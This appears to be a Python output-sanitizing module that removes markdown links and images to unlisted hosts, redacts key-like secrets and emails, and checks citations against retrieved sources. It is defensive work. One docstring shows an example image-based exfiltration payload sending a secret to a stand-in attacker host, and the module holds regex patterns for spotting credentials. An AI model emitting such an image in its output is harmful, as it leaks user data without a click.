import re
from urllib.parse import urlsplit

MD_LINK = re.compile(r"(!?)\[([^\]]*)]\(([^)\s]+)[^)]*\)")
SECRETS = [
    re.compile(r"\bAKIA[0-9A-Z]{16}\b"),
    re.compile(r"\bsk-[A-Za-z0-9_-]{20,}\b"),
    re.compile(r"[\w.+-]+@[\w-]+\.[\w.-]+"),
]


def host_of(url):
    try:
        return (urlsplit(url).hostname or "").lower()
    except ValueError:
        return ""


def strip_unknown_links(text, allowed_hosts):
    """Removes links and images to unknown hosts.

    A rendered image is fetched automatically, so ![x](https://evil.example/?d=SECRET) would
    send data out with no click.
    """
    return MD_LINK.sub(
        lambda m: m.group(0) if host_of(m.group(3)) in allowed_hosts else m.group(2), text
    )


def redact_secrets(text):
    for pattern in SECRETS:
        text = pattern.sub("[removed]", text)
    return text


def citations_valid(cited, retrieved):
    """The model may only cite sources it was actually given."""
    return set(cited) <= set(retrieved)
